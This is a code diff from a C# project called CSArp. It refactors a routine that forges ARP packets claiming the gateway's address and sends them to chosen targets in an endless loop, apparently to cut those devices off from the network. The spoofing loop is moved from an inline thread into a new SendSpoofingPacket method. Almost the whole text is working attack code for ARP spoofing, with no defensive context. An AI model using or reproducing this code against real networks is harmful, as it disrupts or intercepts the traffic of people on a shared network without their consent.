@@ -25,25 +25,31 @@ namespace CSArp
                 var arppacketforgatewayrequest = new ARPPacket(ARPOperation.Request, PhysicalAddress.Parse("00-00-00-00-00-00"), gatewayipaddress, capturedevice.MacAddress, target.Key);
                 var ethernetpacketforgatewayrequest = new EthernetPacket(capturedevice.MacAddress, gatewaymacaddress, EthernetPacketType.Arp);
                 ethernetpacketforgatewayrequest.PayloadPacket = arppacketforgatewayrequest;
-                new Thread(() =>
-                {
-                    disengageflag = false;
-                    DebugOutputClass.Print(view, "Spoofing target " + target.Value.ToString() + " @ " + target.Key.ToString());
-                    try
-                    {
-                        while (!disengageflag)
-                        {
-                            capturedevice.SendPacket(ethernetpacketforgatewayrequest);
-                        }
-                    }
-                    catch (PcapException ex)
-                    {
-                        DebugOutputClass.Print(view, "PcapException @ DisconnectReconnect.Disconnect() [" + ex.Message + "]");
-                    }
-                    DebugOutputClass.Print(view, "Spoofing thread @ DisconnectReconnect.Disconnect() for " + target.Value.ToString() + " @ " + target.Key.ToString() + " is terminating.");
-                }).Start();
+                ThreadBuffer.Add(new Thread(() =>
+                    SendSpoofingPacket(view, target.Key, target.Value, ethernetpacketforgatewayrequest)
+                  ));
                 engagedclientlist.Add(target.Key, target.Value);
             };
+        }
+
+        private static void SendSpoofingPacket(IView view, IPAddress ipAddress, PhysicalAddress physicalAddress, EthernetPacket ethernetpacketforgatewayrequest)
+        {
+
+            disengageflag = false;
+            DebugOutputClass.Print(view, "Spoofing target " + physicalAddress.ToString() + " @ " + ipAddress.ToString());
+            try
+            {
+                while (!disengageflag)
+                {
+                    capturedevice.SendPacket(ethernetpacketforgatewayrequest);
+                }
+            }
+            catch (PcapException ex)
+            {
+                DebugOutputClass.Print(view, "PcapException @ DisconnectReconnect.Disconnect() [" + ex.Message + "]");
+            }
+            DebugOutputClass.Print(view, "Spoofing thread @ DisconnectReconnect.Disconnect() for " + physicalAddress.ToString() + " @ " + ipAddress.ToString() + " is terminating.");
+
         }
 
         public static void Reconnect()
